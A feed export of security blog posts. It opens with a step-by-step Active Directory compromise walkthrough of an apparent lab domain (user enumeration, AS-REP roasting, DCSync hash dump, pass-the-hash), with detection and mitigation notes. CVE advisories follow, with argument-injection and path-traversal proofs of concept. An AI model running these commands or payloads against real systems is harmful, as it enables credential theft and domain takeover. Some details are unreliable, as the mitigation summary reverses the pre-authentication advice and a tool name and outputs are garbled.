items.title: Active Directory Attack Path Analysis
items.summary: Disclaimer: This content is intended solely for educational purposes and authorized security testing in controlled environments. Unauthorized use against systems you do not own or have explicit permission to test is prohibited. Active Directory (AD) remains the dominant identity and access management solution in enterprise…
items.content_html:
Disclaimer: This content is intended solely for educational purposes and authorized security testing in controlled environments. Unauthorized use against systems you do not own or have explicit permission to test is prohibited.

Introduction

Active Directory (AD) remains the dominant identity and access management solution in enterprise environments, making it a primary target during internal penetration tests. A single misconfigured account or overlooked privilege can cascade into full domain compromise. This article presents a methodical AD attack chain  from an unauthenticated position to complete control over a Windows domain  explaining the underlying technology, the commands used, and the defensive gaps that enable each phase.

The engagement begins with a single IP address and no credentials. The target is a Windows Domain Controller identified by its open ports and service banners. The scenario mirrors common enterprise misconfigurations: legacy authentication settings, weak service account passwords, improper delegation of replication privileges, and reliance on NTLM pass-the-hash vectors.

The following sections walk through each phase of the attack, with an emphasis on the why behind each technique and the how to detect or prevent it.

Network Reconnaissance

Every penetration test begins with discovery. The goal of this phase is to identify the target's role, operating system, domain affiliation, and the services it exposes to the network.

nmap -Pn -p 53,80,88,135,139,389,445,464,593,636,3268,3269,3389,5985,9389,47001 -sV -T4 <TARGET_IP>

This scan targets the standard Active Directory service ports. Each port corresponds to a specific protocol essential to domain operations:

  • 53/TCP (DNS): Domain Name Service is integral to AD for locating domain controllers and resolving domain resources.
  • 88/TCP (Kerberos): The core authentication protocol for AD. Kerberos issues tickets that grant access to domain resources without re-entering credentials.
  • 135/TCP (RPC Endpoint Mapper): Used by Windows for inter-process communication and service discovery.
  • 389/TCP (LDAP): Lightweight Directory Access Protocol — the primary query interface for reading and writing to the AD database.
  • 445/TCP (SMB): Server Message Block — the file-sharing and named-pipe transport protocol. SMB is frequently abused for enumeration, credential harvesting, and lateral movement.
  • 5985/TCP (WinRM): Windows Remote Management — provides remote PowerShell and command execution capabilities over HTTP.
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP
                              (Domain: spookysec.local)
445/tcp   open  microsoft-ds
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (WinRM)

The LDAP banner leaks the domain name (spookysec.local). The presence of Kerberos, LDAP, and SMB on a single host, combined with port 5985 (WinRM) and 3389 (RDP), identifies this system as a Domain Controller running Windows Server 2019 (build 17763).

Why this matters: Identifying a Domain Controller early informs every subsequent decision. All Kerberos requests, LDAP queries, and SMB interactions will be directed at this host using the discovered domain name.

Domain Enumeration

With the domain name identified, the next step is to verify domain controller properties and confirm the attack surface via SMB negotiation.

netexec smb <TARGET_IP>

The netexec tool (formerly CrackMapExec) sends an SMB protocol negotiation request. The response from the server includes the NetBIOS domain name, the DNS domain name, the hostname, the operating system version, and whether SMB signing is enforced.

SMB         <TARGET_IP>  445  ATTACKTIVEDIREC  [*] Windows 10 / Server 2019 Build 17763 x64
              (name:ATTACKTIVEDIREC) (domain:spookysec.local) (signing:True) (SMBv1:False)

Key findings:

  • Domain: spookysec.local
  • Hostname: ATTACKTIVEDIREC
  • OS Build: 17763 (Windows Server 2019)
  • SMB Signing: Enabled (mutual authentication required for SMB connections)
  • SMBv1: Disabled (a positive security finding — SMBv1 was disabled by default after MS17-010)

SMB signing being enabled means NTLM relay attacks against SMB targets will not work between signed hosts, but it does not prevent authenticated SMB access or Kerberos-based attacks.

User Enumeration

With a domain name but no credentials, the next objective is to discover valid user accounts. Kerberos provides an ideal oracle for this purpose because its error codes differ between existing and non-existing accounts.

Kerberos User Enumeration with Kerbrute

The Kerberos protocol defines specific error messages during the authentication service request (AS-REQ) phase:

  • KRB5KDC_ERR_PREAUTH_REQUIRED (0x25): The user exists but pre-authentication is required. This is the normal response for a valid user.
  • KRB5KDC_ERR_C_PRINCIPAL_UNKNOWN (0x6): The user does not exist in the domain.

These distinct responses allow unauthenticated enumeration of domain users by simply sending AS-REQ messages with candidate usernames and observing the error code returned.

kerbrute userenum -d spookysec.local --dc <TARGET_IP> /wordlists/users.txt

2026/07/01 19:58:31 >  [+] VALID USERNAME:  james@spookysec.local
2026/07/01 19:58:31 >  [+] VALID USERNAME:  svc-admin@spookysec.local
2026/07/01 19:58:31 >  [+] VALID USERNAME:  robin@spookysec.local
2026/07/01 19:58:31 >  [+] VALID USERNAME:  darkstar@spookysec.local
2026/07/01 19:58:31 >  [+] VALID USERNAME:  administrator@spookysec.local
2026/07/01 19:58:31 >  [+] VALID USERNAME:  backup@spookysec.local
2026/07/01 19:58:31 >  [+] VALID USERNAME:  paradox@spookysec.local
2026/07/01 19:58:31 >  [+] VALID USERNAME:  ori@spookysec.local

Eight valid domain users are identified. Among them, svc-admin and backup stand out as potentially privileged service accounts. The administrator account is also confirmed, which is valuable for later pass-the-hash validation.

Why this matters: Without this enumeration step, subsequent AS-REP roasting attempts would be blind. Knowing which accounts exist enables targeted attacks against misconfigured users.

Defensive Consideration

Kerbrute enumeration cannot be prevented by disabling pre-authentication alone — it exploits the fundamental Kerberos error code differentiation. Defenses include:

  • Monitoring Event ID 4768 (Kerberos TGT requested) for anomalous volumes of AS-REQ failures from a single source.
  • Enabling Kerberos armoring (FAST) where supported, which protects the initial AS-REQ exchange.
  • Restricting network access to port 88/TCP to only authorized domain members.

AS-REP Roasting

Background: Kerberos Pre-Authentication

In standard Kerberos authentication, the Authentication Service Request (AS-REQ) includes a timestamp encrypted with the user's NTLM hash. This pre-authentication data proves to the Key Distribution Center (KDC) that the requester knows the user's password before any ticket is issued. If the KDC cannot decrypt the timestamp, it refuses the request.

However, Active Directory allows accounts to be configured with the "Do not require Kerberos pre-authentication" flag (UF_DONT_REQUIRE_PREAUTH). This legacy setting was originally designed for compatibility with non-Windows Kerberos implementations that could not perform pre-authentication. When this flag is set, the KDC will issue an encrypted Ticket Granting Ticket (TGT) to anyone who requests one for that user — without any proof of password knowledge.

The Attack

The TGT returned by the KDC is encrypted with the user's NTLM hash. An attacker who captures this TGT can extract the encrypted portion and attempt to crack it offline using a dictionary or brute-force attack.

a.py spookysec.local/ -dc-ip <TARGET_IP> -usersfile valid_users.txt -request -format hashcat

This tool from the Impacket suite sends an AS-REQ for each user without pre-authentication data. If the user has the DONT_REQUIRE_PREAUTH flag set, the KDC returns an AS-REP containing an encrypted TGT. The output is formatted for Hashcat (mode 18200).

$krb5asrep$23$svc-admin@SPOOKYSEC.LOCAL:e2ff9604df420fa561af327bfb1f3540$...
[-] User james doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User robin doesn't have UF_DONT_REQUIR_PREAUTH se
...

Only svc-admin has the pre-authentication flag disabled. The returned hash is then cracked using Hashcat in mode 18200 (Kerberos 5 AS-REP etype 23 — RC4-HMAC):

hashcat -m 18200 hash.txt /wordlists/passwords.txt --force

$krb5asrep$23$svc-admin@SPOOKYSEC.LOCAL:...:management2005

Recovered credential: svc-admin:management2005

Why This Worked

The svc-admin account had two exploitable conditions:

  1. Kerberos pre-authentication disabled — allowing unauthenticated TGT requests.
  2. Weak password (management2005) — the RC4-HMAC hash was cracked near-instantly against a modest wordlist.

Detection

Artifact Source Event ID
Kerberos TGT request without pre-auth Domain Controller Security Log 4768 (with Pre-Authentication field = false)
AS-REP hash retrieval (TGS-REQ for unusual SPN) Domain Controller 4769

Mitigation

  1. Audit all accounts with DONT_REQUIRE_PREAUTH set using PowerShell:

    Get-ADUser -Filter {DoesNotRequirePreAuth -eq $true} -Properties DoesNotRequirePreAuth

  2. Enable pre-authentication on any account that does not require it for legacy compatibility.

  3. Enforce strong password policies for all service accounts.

  4. Use Group Managed Service Accounts (gMSAs) for services where possible.

SMB Enumeration

With valid credentials (spookysec.local\svc-admin:management2005), the next phase is to enumerate accessible resources on the domain controller.

Enumerating Network Shares

SMB shares often contain configuration files, scripts, backups, or other sensitive data. The --shares flag enumerates all available shares and their access permissions.

netexec smb <TARGET_IP> -u 'svc-admin' -p 'management2005' --shares

SMB         <TARGET_IP>  445  ATTACKTIVEDIREC  [+] spookysec.local\svc-admin:management2005
SMB         <TARGET_IP>  445  ATTACKTIVEDIREC  Share           Permissions
SMB         <TARGET_IP>  445  ATTACKTIVEDIREC  -----           -----------
SMB         <TARGET_IP>  445  ATTACKTIVEDIREC  ADMIN$          (Remote Admin)
SMB         <TARGET_IP>  445  ATTACKTIVEDIREC  backup          READ
SMB         <TARGET_IP>  445  ATTACKTIVEDIREC  IPC$            READ
SMB         <TARGET_IP>  445  ATTACKTIVEDIREC  NETLOGON        READ
SMB         <TARGET_IP>  445  ATTACKTIVEDIREC  SYSVOL          READ

The backup share is notable — it is not a default AD share (unlike ADMIN$, C$, NETLOGON, SYSVOL, and IPC$) and appears to be custom-created. It is readable by svc-admin.

Accessing the Backup Share

smbclient //<TARGET_IP>/backup -U 'spookysec.local\svc-admin'

Inside the share, a single file is found:

backup_credentials.txt    (48 bytes)

Downloading and examining the file reveals a Base64-encoded string:

YmFja3VwQHNwb29reXNlYy5sb2NhbDpiYWNrdXAyNTE3ODYw

Base64 is a binary-to-text encoding scheme, not encryption. Decoding is trivial:

backup@spookysec.local:backup2517860

This yields credentials for the backup domain user.

Why This Worked

  • Plaintext credentials were stored in an SMB share accessible to a low-privilege service account.
  • The file used Base64 encoding, which provides no real security — it is easily reversible by anyone with access to the file.
  • The share was readable by svc-admin, which should never have access to backup credentials.

Detection

  • Monitor Event ID 5140 (share object accessed) for anomalous access to non-standard shares.
  • Audit file permission changes on sensitive shares.

Mitigation

  • Never store credentials in SMB shares accessible to non-privileged accounts.
  • Use Windows Credential Manager, LAPS, or a secrets management solution (e.g., HashiCorp Vault).
  • Restrict share permissions using the principle of least privilege.
  • Encrypt sensitive files at rest; Base64 does not constitute encryption.

Privilege Escalation: DCSync

Background: Active Directory Replication

Domain Controllers replicate their database (NTDS.dit) among themselves using the Directory Replication Service (DRS) protocol, exposed via the MS-DRSR RPC interface. This replication mechanism allows DCs to synchronize password hashes, group memberships, and all other directory objects.

Certain accounts — notably those in the Domain Controllers group and accounts delegated with specific replication rights — can initiate replication requests. Two extended rights control this capability:

  • DS-Replication-Get-Changes (GUID: 1131f6aa-9c07-11d1-f79f-00c04fc2dcd1)
  • DS-Replication-Get-Changes-All (GUID: 1131f6ad-9c07-11d1-f79f-00c04fc2dcd1)

An account with these rights can impersonate a Domain Controller and request replication of the entire AD database, including all password hashes. This is the DCSync attack.

Executing DCSync

The backup account was configured with these replication rights. This is a known pattern — backup software often requires the ability to read all directory objects, and the easiest way to grant this is through the "Replicating Directory Changes All" permission on the domain root.

netexec smb <TARGET_IP> -u 'backup' -p 'backup2517860' --ntds

SMB   <TARGET_IP>  445  ATTACKTIVEDIREC  [+] spookysec.local\backup:backup2517860
SMB   <TARGET_IP>  445  ATTACKTIVEDIREC  Administrator:500:aad3b435b51404eeaad3b435b51404ee:0e0363213e37b94221497260b0bcb4fc:::
SMB   <TARGET_IP>  445  ATTACKTIVEDIREC  krbtgt:502:aad3b435b51404eeaad3b435b51404ee:0e2eb8158c27bed09861033026be4c21:::
SMB   <TARGET_IP>  445  ATTACKTIVEDIREC  spookysec.local\svc-admin:1114:aad3b435b51404eeaad3b435b51404ee:fc0f1e5359e372aa1f69147375ba6809:::
...
SMB   <TARGET_IP>  445  ATTACKTIVEDIREC  [+] Dumped 18 NTDS hashes

The netexec tool leverages the backup account's replication privileges to request a full copy of the NTDS.dit database. The output contains every domain user's NT hash (the first component after the RID) and LM hash (the first hex string, typically aad3b435b51404eeaad3b435b51404ee indicating "no LM hash stored").

Of particular interest:

  • Administrator NTLM: 0e0363213e37b94221497260b0bcb4fc
  • krbtgt NTLM: 0e2eb8158c27bed09861033026be4c21

The krbtgt hash is especially sensitive — it is used to sign all Kerberos Ticket Granting Tickets in the domain. Compromise of krbtgt enables Golden Ticket attacks, allowing an attacker to forge TGTs for any user (including non-existent ones) indefinitely.

Why This Worked

  • The backup account was granted DS-Replication-Get-Changes-All on the domain root.
  • This is a common misconfiguration when administrators grant backup applications excessive privileges rather than scoping them to specific OUs or using granular delegated permissions.
  • The backup account had a weak password (backup2517860) that could itself be cracked if needed.

Detection

Artifact Source Event ID
DS-Replication-Get-Changes-All Domain Controller Security Log 4662 (Access to an Active Directory object)
Replication attempt from non-DC source Directory Service 4928, 4929

The key detection signal is a replication request originating from a non-Domain Controller system. Domain Controllers replicate among themselves as a matter of course, but a workstation or server should never initiate replication.

Mitigation

  1. Audit the Replicating Directory Changes permissions on the domain root:

    Get-ACL "AD:DC=spookysec,DC=local" | Select -ExpandProperty Access | Where {$_.ActiveDirectoryRights -match "Replicating"}

  2. Remove these permissions from all non-DC accounts.

  3. Use dedicated backup solutions that do not require DCSync capabilities (e.g., Windows Server Backup).

  4. Monitor for Event ID 4662 where the AccessMask corresponds to DS-Replication-Get-Changes (0x100).

Pass-the-Hash

Background: NTLM Authentication Flow

NTLM is a challenge-response authentication protocol. The flow is:

  1. The client sends a negotiate message requesting authentication.
  2. The server responds with an 8-byte random challenge.
  3. The client encrypts this challenge using the user's NTLM hash and sends it back as the authenticate message.
  4. The server (or a Domain Controller) independently computes the expected response using the stored NTLM hash and compares.

Critically, the NTLM hash is the only secret needed to compute the correct response. The plaintext password is never required. If an attacker possesses the NTLM hash, they can authenticate as that user without knowing the password.

Pass-the-Hash via WinRM

Windows Remote Management (WinRM) accepts NTLM authentication. With the Administrator's NTLM hash extracted from the DCSync dump, we can authenticate directly:

netexec winrm <TARGET_IP> -u 'Administrator' -H 0e0363213e37b94221497260b0bcb4fc -d 'spookysec.local' -X 'whoami'

WINRM   <TARGET_IP>  5985  <TARGET_IP>  [+] spookysec.local\Administrator (Pwn3d!)
WINRM   <TARGET_IP>  5985  <TARGET_IP>  thm-ad\administrator

The (Pwn3d!) indicator confirms full administrative access on the target. We are now executing commands in the security context of the Domain Administrator.

Why This Worked

  • The NTLM hash was recoverable through the DCSync attack, which was possible because the backup account had excessive replication privileges.
  • WinRM was enabled on the Domain Controller, providing a remote command execution channel.
  • No additional factor (Credential Guard, Just Enough Administration, or network segmentation) prevented hash reuse.

Detection

Artifact Source Event ID
Logon with explicit credentials Target System Security Log 4648 (if explicit)
Network logon from non-DC host Domain Controller Security Log 4624 (Logon Type 3 or 10)

The most effective detection of pass-the-hash attacks involves monitoring for Logon Type 3 (network logon) events from NTLM where the source workstation is not the expected management host for that target.

Mitigation

  1. Enable Credential Guard — isolates NTLM hashes in a virtualized secure enclave, preventing extraction even from an elevated process.
  2. Restrict WinRM access — configure WinRM firewall rules and TrustedHosts to accept connections only from designated management hosts.
  3. Disable NTLM where possible — configure the domain to use Kerberos only (though legacy compatibility often prevents this).
  4. Implement Privileged Access Workstations (PAWs) — administrative actions must originate from dedicated, hardened workstations.
  5. Use Just Enough Administration (JEA) — limit the commands available to administrative sessions.

Detection Opportunities Summary

The following table maps each attack phase to relevant Windows security events:

Attack Phase Event ID Description
Kerberos User Enumeration 4768 Multiple TGT requests with KRB5KDC_ERR_C_PRINCIPAL_UNKNOWN
AS-REP Roasting 4768 TGT request for account with pre-auth disabled
SMB Share Access 5140 Access to non-standard SMB share
DCSync 4662 Access to domain root with Replicating Directory Changes
DCSync 4928/4929 Replication from non-DC source
Pass-the-Hash 4624 Network logon (Type 3) using NTLM from unexpected source

MITRE ATT&CK Mapping

Technique ID Tactic
Active Scanning T1595.001 Reconnaissance
Domain Account Discovery T1087.002 Discovery
Valid Accounts T1078 Initial Access
Kerberoasting / AS-REP Roasting T1558.003 Credential Access
SMB/Windows Admin Shares T1021.002 Lateral Movement
OS Credential Dumping: DCSync T1003.006 Credential Access
Pass-the-Hash T1550.002 Lateral Movement / Defense Evasion
Remote Services: WinRM T1021.006 Lateral Movement
Use Alternate Authentication Material T1550 Lateral Movement

Mitigation Summary

Attack Phase Primary Mitigation
User Enumeration Restrict port 88/TCP access; monitor anomalous TGT request volume
AS-REP Roasting Disable pre-authentication on all accounts; enforce strong passwords
SMB Enumeration Least-privilege share permissions; never store credentials in accessible shares
DCSync Remove replication permissions from non-DC accounts; audit domain root ACLs
Pass-the-Hash Enable Credential Guard; restrict WinRM; phase out NTLM

Conclusion

This attack chain demonstrates a common but devastating path to full Active Directory compromise that relies on only a handful of misconfigurations:

  1. A service account with pre-authentication disabled and a weak password yields the first credential pair through AS-REP roasting.
  2. Credentials stored in a readable network share provides elevation to a privileged backup account.
  3. Excessive replication permissions on the backup account enables a DCSync attack, dumping all domain password hashes.
  4. NTLM pass-the-hash against WinRM provides immediate Domain Administrator access.

Each of these misconfigurations is individually preventable. The combination, however, creates a kill chain that no single defense can stop. Effective AD security requires a layered approach: strong authentication policies, least-privilege delegation, credential hygiene, and continuous monitoring for the specific behavioral signals outlined in this article.

The most critical takeaway is this: DCSync is the crown jewel. If an attacker reaches this phase, game-over is inevitable. Protecting replication permissions — combined with enabling Credential Guard to prevent hash extraction even from elevated contexts — provides the highest return on defensive investment.

References

  • Impacket: https://github.com/fortra/impacket
  • Kerbrute: https://github.com/ropnop/kerbrute
  • NetExec (formerly CrackMapExec): https://github.com/Pennyw0rth/NetExec
  • MITRE ATT&CK: https://attack.mitre.org
  • Microsoft Security Event 4662: https://learn.microsoft.com/en-us/windows/security/threat-protection/auditing/event-4662
  • MS-DRSR Protocol: https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-drsr/

 

 

EFO

items.title: CVE-2026-55061
items.summary: Summary A vulnerability exists in uniget CLI v0.27.3 due to unsafe parsing of the EDITOR and UNIGET_EDITOR environment variables. The application uses strings.Split() to parse editor commands, which does not correctly handle shell-style quoting and arguments. An attacker who can influence the editor configuration may…
items.content_html:
Summary

A vulnerability exists in uniget CLI v0.27.3 due to unsafe parsing of the EDITOR and UNIGET_EDITOR environment variables. The application uses strings.Split() to parse editor commands, which does not correctly handle shell-style quoting and arguments.

An attacker who can influence the editor configuration may cause unintended command execution through a malicious wrapper script or crafted editor command.

Vulnerability Details

The issue is located in hooks.go where the editor command is parsed before execution.

Vulnerable Code

editor := os.Getenv("UNIGET_EDITOR")
if len(editor) == 0 {
    editor = os.Getenv("EDITOR")
}

editorWithArgs := strings.Split(editor, " ")
command := exec.Command(editorWithArgs[0], editorWithArgs[1:]...)

The application naively splits the editor string on spaces instead of performing proper shell-style parsing. This behavior allows attacker-controlled arguments to be passed to an executable specified in the editor configuration.

Impact

Successful exploitation may allow:

  • Execution of unintended commands through a malicious editor wrapper.
  • Abuse of trusted editor configurations.
  • Execution of arbitrary programs with the privileges of the current user.
  • Unexpected behavior when using editor commands containing spaces or complex arguments.

The impact is limited to the privileges of the user running uniget.

Proof of Concept

Step 1: Create a Wrapper Script

mkdir -p /tmp/poc-editor

cat > /tmp/poc-editor/editor_wrapper.sh << 'EOF'
#!/bin/bash
echo "[EDITOR] Received args: $@"
id
EOF

chmod +x /tmp/poc-editor/editor_wrapper.sh

Step 2: Create a Test Hook

mkdir -p ~/.config/uniget/hooks/pre-install

cat > ~/.config/uniget/hooks/pre-install/test.sh << 'EOF'
#!/bin/bash
echo "Test hook"
EOF

chmod 700 ~/.config/uniget/hooks/pre-install/test.sh

Step 3: Configure EDITOR

export EDITOR="/tmp/poc-editor/editor_wrapper.sh && id && echo"

Step 4: Execute the Vulnerable Functionality

go build -o uniget ./cmd/uniget

./uniget hooks edit --type=pre-install test.sh

Step 5: Observe Execution

[EDITOR] Received args: && id && echo /path/to/hook
uid=1000(w4nn4d13) gid=1000(w4nn4d13)

The output demonstrates that attacker-controlled arguments are passed to the invoked executable, resulting in execution of unintended functionality.

Affected Version

  • uniget CLI v0.27.3

CWE Classification

  • CWE-88: Improper Neutralization of Argument Delimiters in a Command

Remediation

Avoid parsing editor commands with strings.Split(). Instead:

  • Use a proper shell-aware parser.
  • Validate editor paths before execution.
  • Restrict execution to trusted editor binaries where appropriate.
  • Consider storing executable paths and arguments separately.

EFO

items.title: CVE-2026-55062
items.summary: Summary A Path Traversal vulnerability exists in uniget CLI v0.27.3 that allows local users to access and modify arbitrary files outside the intended hooks directory through directory escape sequences (../) in hook filenames. The vulnerability originates from insufficient validation of user-supplied hook filenames in hooks.go.
items.content_html:
Summary

A Path Traversal vulnerability exists in uniget CLI v0.27.3 that allows local users to access and modify arbitrary files outside the intended hooks directory through directory escape sequences (../) in hook filenames.

Vulnerability Details

The vulnerability originates from insufficient validation of user-supplied hook filenames in hooks.go. The application directly concatenates user input with the hooks directory path without sanitizing traversal sequences.

Vulnerable Code

hookFileName := args[0]
hookFile = preInstallHooksDir + "/" + hookFileName

Because hookFileName is not validated, attackers can supply path traversal sequences such as ../../../../etc/passwd to escape the intended directory.

Impact

An attacker can:

  • Read arbitrary files accessible to the current user.
  • Modify arbitrary files when write permissions are available.
  • Escape the designated hooks directory.
  • Access sensitive configuration or credential files belonging to the same user.

The impact is limited to the privileges of the user executing the application.

Proof of Concept

Step 1

Configure a simple editor:

export EDITOR="cat"

Step 2

Trigger path traversal:

./uniget hooks edit --type=pre-install "../../../../etc/passwd"

Step 3

Observe disclosure of file contents:

root:x:0:0:root:/root:/bin/bash
daemon:x:2:2:daemon:/sbin:/sbin/nologin
...

Affected Version

  • uniget CLI v0.27.3

CWE Classification

  • CWE-22: Path Traversal
  • CWE-23: Relative Path Traversal
  • CWE-36: Absolute Path Traversal
  • CWE-73: External Control of File Name or Path

Remediation

Validate and sanitize user-supplied filenames before constructing file paths. Restrict file operations to the intended hooks directory using secure path canonicalization and traversal checks.

EFO

items.title: CVE-2026-9506: Unauthenticated Local File Inclusion (LFI) in Bagisto
items.summary: Summary An Unauthenticated Local File Inclusion (LFI) vulnerability was identified in Bagisto. Due to insufficient validation of user-supplied input, an attacker could manipulate file paths and potentially access arbitrary files stored on the server without requiring authentication. The issue was responsibly disclosed, fixed by the…
items.content_html:
Summary

An Unauthenticated Local File Inclusion (LFI) vulnerability was identified in Bagisto. Due to insufficient validation of user-supplied input, an attacker could manipulate file paths and potentially access arbitrary files stored on the server without requiring authentication.

The issue was responsibly disclosed, fixed by the vendor, and assigned CVE-2026-9506 through the CERT-In coordinated vulnerability disclosure process.

Impact

Successful exploitation could allow an attacker to:

  • Read sensitive application files.
  • Access configuration files containing database credentials.
  • Retrieve environment variables and API keys.
  • Gather information useful for further attacks.

The vulnerability does not necessarily lead to remote code execution by itself, but exposure of sensitive files can significantly increase the risk of compromise.

What is a Local File Inclusion (LFI)?

Local File Inclusion (LFI) is a vulnerability where a web application allows user-controlled input to determine which file is loaded or displayed.

If proper validation is missing, an attacker may use directory traversal sequences (such as ../) to access files outside the intended directory.

Simple Example

Suppose an application loads pages like this:

https://example.com/?page=about.html

Internally, it may do something similar to:

include($_GET['page']);

An attacker could try:

?page=../../../etc/passwd

If the input is not properly validated, the server may return the contents of a local system file instead of the intended page.

Example Payload

../../../etc/passwd

or URL-encoded:

..%2F..%2F..%2Fetc%2Fpasswd

(This is a generic educational example commonly used to demonstrate LFI concepts and is not specific to the affected product.)

References

  • CVE: https://www.cve.org/CVERecord?id=CVE-2026-9506
  • CERT-In Vulnerability Note: https://www.cert-in.org.in/s2cMainServlet?pageid=PUBVLNOTES01&VLCODE=CIVN-2026-0292
  • CWE-98: Improper Control of Filename for Include/Require Statement in PHP Program
  • OWASP - Path Traversal: https://owasp.org/www-community/attacks/Path_Traversal

items.title: CVE-2026-48098 Unsafe Use of sudo and shell=True in NexTOR IP Changer
items.summary: Overview CVE-2026-48098 is a high-severity vulnerability affecting NexTOR IP Changer. The issue resulted from the application's use of privileged system commands through sudo in combination with shell-based command execution. In certain deployment environments where passwordless sudo (NOPASSWD) is configured, privileged operations could execute without additional…
items.content_html:
Overview

CVE-2026-48098 is a high-severity vulnerability affecting NexTOR IP Changer. The issue resulted from the application's use of privileged system commands through sudo in combination with shell-based command execution.

In certain deployment environments where passwordless sudo (NOPASSWD) is configured, privileged operations could execute without additional user confirmation, increasing the potential impact of misuse or unintended command execution.

The issue was identified and fully remediated through improvements to the application's privilege management and command execution architecture.

Technical Description

The affected version relied on privileged operating system commands to perform network configuration tasks.

These operations were executed through shell-based mechanisms while invoking sudo, creating unnecessary reliance on shell interpretation and elevated privileges.

In environments with permissive sudo configurations, the application could perform privileged operations without requiring explicit user authentication.

Although the application was designed for administrative network management, this execution model increased the overall security risk and reduced defense-in-depth protections.

Potential Impact

Successful exploitation or misuse could potentially allow:

  • Execution of privileged system commands.
  • Unauthorized system-level modifications.
  • Increased impact of command execution vulnerabilities.
  • Elevated risk in environments using passwordless sudo.
  • Abuse of administrative functionality.

The practical impact depends on the local system configuration and privilege model.

Remediation

The vulnerability was fully addressed in NexTOR IP Changer v2.0.0 through a comprehensive review and redesign of the application's privilege handling model.

Privilege Management Improvements

The application's execution flow was updated to reduce unnecessary dependence on elevated privileges during normal operation.

Administrative actions are now handled through a more controlled and secure execution model.

Secure Process Execution

Command execution mechanisms were reviewed and improved to minimize reliance on shell-based invocation patterns for privileged operations.

The application now follows safer execution practices for interacting with underlying system components.

Sudo Workflow Hardening

The handling of privileged operations was redesigned to reduce the security impact of permissive sudo configurations.

Application behavior no longer assumes or depends upon insecure system-level privilege settings.

Environment Security Review

Additional safeguards were implemented to improve the security of runtime environments and reduce the likelihood of privilege-related misuse.

Potentially unsafe execution conditions are now handled more defensively.

Defense-in-Depth Enhancements

As part of the remediation effort, several additional security improvements were introduced:

  • Review of all privileged execution paths.
  • Reduction of unnecessary elevated operations.
  • Improved validation before administrative actions are performed.
  • Hardening of application runtime behavior.
  • Review of external process invocation logic.
  • Reduction of the overall local attack surface.

Codebase Security Audit

A broader audit of the codebase was conducted to identify and remediate similar patterns involving privileged command execution and shell interaction.

Related components were reviewed and updated where necessary.

Post-Remediation Verification

Following implementation of the fixes, extensive testing was performed to verify that:

  • Privileged operations follow the updated security model.
  • Application behavior is consistent across supported environments.
  • Previously affected execution paths no longer introduce unnecessary security risks.
  • The updated controls function correctly under various system configurations.

Users and deployments running affected versions should upgrade to NexTOR IP Changer v2.0.0 or later.

Affected Version

1.0.0-1

Fixed Version

v2.0.0

References

  • GitHub Advisory:
    https://github.com/advisories/GHSA-fpxg-q9p5-5wvm
  • Release Notes:
    https://github.com/0x5t4l1n/NexTOR_IP_CHANGER/releases/tag/v2.0.0

Credits

Remediation Developer: 0x5t4l1n

Research. Remediate. Reinforce.

items.title: CVE-2026-48097 PATH Injection Leading to Arbitrary Command Execution in NexTOR IP Changer
items.summary: Overview CVE-2026-48097 is a high-severity vulnerability affecting NexTOR IP Changer. The issue originated from unsafe command execution practices that relied on executable resolution through the system PATH environment variable. Under specific conditions, an attacker capable of influencing the execution environment could cause the application to…
items.content_html:
Overview

CVE-2026-48097 is a high-severity vulnerability affecting NexTOR IP Changer. The issue originated from unsafe command execution practices that relied on executable resolution through the system PATH environment variable.

Under specific conditions, an attacker capable of influencing the execution environment could cause the application to invoke attacker-controlled binaries instead of legitimate system utilities.

The vulnerability was identified and fully remediated through improvements to the application's command execution model and process handling logic.

Technical Description

The affected version executed certain system commands using mechanisms that relied on locating executables through the current PATH environment.

If an attacker controlled or manipulated this environment, malicious executables placed earlier in the search path could be executed in place of trusted system binaries.

This behavior could result in unintended execution of attacker-controlled code within the security context of the application.

Potential Impact

Successful exploitation could potentially allow:

  • Arbitrary command execution.
  • Execution of attacker-controlled binaries.
  • Abuse of trusted application functionality.
  • Potential privilege escalation depending on deployment configuration.
  • Compromise of local system integrity and availability.

The practical impact depends on the privileges available to the affected process.

Remediation

The vulnerability was fully addressed in NexTOR IP Changer v2.0.0 through a comprehensive review and redesign of the application's process execution mechanisms.

Secure Command Execution

The command execution workflow was updated to eliminate unsafe execution patterns that relied on external shell resolution.

The application now invokes trusted system components using explicit execution paths wherever applicable.

PATH Resolution Hardening

Internal handling of executable resolution was reviewed and improved to prevent unintended reliance on user-controlled environment variables.

Application behavior no longer depends on externally supplied search paths for security-sensitive operations.

Environment Validation

Additional safeguards were implemented to validate and control the execution environment before privileged operations are performed.

Potentially unsafe environment configurations are now handled more securely.

Process Isolation Improvements

The execution subsystem was updated to reduce trust in inherited runtime state and to minimize opportunities for environment-based manipulation.

Defense-in-Depth Enhancements

As part of the remediation effort, several additional security improvements were introduced:

  • Review of all external process invocation points.
  • Removal of unnecessary shell-dependent execution patterns.
  • Improved validation around privileged operations.
  • Hardening of application runtime configuration.
  • Reduction of the overall local attack surface.
  • Additional internal security checks before executing system-level functionality.

Codebase Security Audit

A broader audit of the codebase was performed to identify and remediate similar command execution patterns that could introduce environment-related security risks.

Related components were reviewed and updated where necessary.

Post-Remediation Verification

Following implementation of the fixes, extensive testing was performed to verify that:

  • Application behavior no longer depends on attacker-controlled PATH values.
  • Trusted executables are invoked correctly.
  • Previously affected execution paths cannot be redirected.
  • Updated security controls function consistently across supported environments.

Users and deployments running affected versions should upgrade to NexTOR IP Changer v2.0.0 or later.

Affected Version

1.0.0-1

Fixed Version

v2.0.0

References

  • GitHub Advisory:
    https://github.com/advisories/GHSA-vx6r-vwjq-567w
  • Release Notes:
    https://github.com/0x5t4l1n/NexTOR_IP_CHANGER/releases/tag/v2.0.0

Credits

Remediation Developer: 0x5t4l1n

Research. Remediate. Reinforce.

items.title: CVE-2026-44720 — Authentication Bypass via Disabled JWT Signature Verification in OpenLearnX
items.summary: Overview CVE-2026-44720 is a moderate-severity authentication vulnerability affecting OpenLearnX. Under certain authentication flows, insufficient JWT signature verification could allow attackers to supply forged authentication tokens and bypass normal identity validation. The issue originated from improper enforcement of cryptographic verification during token processing, creating a scenario…
items.content_html:
Overview

CVE-2026-44720 is a moderate-severity authentication vulnerability affecting OpenLearnX. Under certain authentication flows, insufficient JWT signature verification could allow attackers to supply forged authentication tokens and bypass normal identity validation.

